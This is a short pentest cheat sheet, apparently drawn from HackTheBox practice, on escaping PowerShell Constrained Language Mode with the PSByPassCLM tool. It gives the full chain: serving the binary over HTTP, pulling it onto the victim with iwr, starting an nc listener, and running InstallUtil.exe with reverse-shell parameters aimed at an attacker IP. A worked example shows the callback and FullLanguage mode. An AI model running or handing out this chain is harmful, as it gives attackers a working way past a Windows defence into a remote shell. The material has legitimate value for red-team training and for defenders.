# Bypass Constraint Language in PowerShell

## PSByPassCLM

It’s possible that sometimes when you gain access to a Windows machine and you have a PowerShell, that this is in a constraint language context. In the victim machine, you can check that with the `$ExecutionContext.SessionState.LanguageMode` command. PSByPassCLM can bypass this by creating a new reverse shell, you can bypass this context.

Clone the PSByPassCLM repository

```text
git clone https://github.com/padovah4ck/PSByPassCLM
```

Transfer PSByPassCLM.exe to the victim machine, to do this we need a listener:

```text
cd PSByPassCLM/PSByPassCLM/PSBypassCLM/bin/x64/Debug
python -m http.server 80
```

Then we may be able to download the file to our target machine with:

```text
iwr -uri http://10.10.10.11/PsByPassCLM.exe -OutFile c:\temp\psby.exe
```

Set up a listening port to catch a reverse shell connection:

```text
rlwrap nc -nlvp 443
```

Run the reverse shell with the following command:

```text
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=true /revshell=true /rhost=10.10.10.11 /rport=443 /U c:\temp\psby.exe
```

In the new shell session, if you type `$ExecutionContext.SessionState.LanguageMode`, you will be able to check if you're in a `FullLanguage` context.

## Example Scenario

```text
PS htb\amanda@SIZZLE Documents> C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=true /U /revshell=true /rhost=10.10.10.15 /rport=443 \users\amanda\appdata\local\temp\a.exe
Microsoft (R) .NET Framework Installation utility Version 4.6.1586.0
Copyright (C) Microsoft Corporation.  All rights reserved.


The uninstall is beginning.
See the contents of the log file for the C:\users\amanda\appdata\local\temp\a.exe assembly's progress.
The file is located at .
Uninstalling assembly 'C:\users\amanda\appdata\local\temp\a.exe'.
Affected parameters are:
   assemblypath = C:\users\amanda\appdata\local\temp\a.exe
   rport = 443
   revshell = true
   rhost = 10.10.10.15
   logtoconsole = true
   logfile = 
Trying to connect back...
```

In another shell listen on the port 443:

```text
root@kali# rlwrap nc -lnvp 443
Ncat: Version 7.70 ( https://nmap.org/ncat )
Ncat: Listening on :::443
Ncat: Listening on 0.0.0.0:443
Ncat: Connection from 10.10.10.103.
Ncat: Connection from 10.10.10.103:62228.
whoami
htb\amanda
PS C:\Users\amanda\Documents> $executioncontext.sessionstate.languagemode
FullLanguage
```

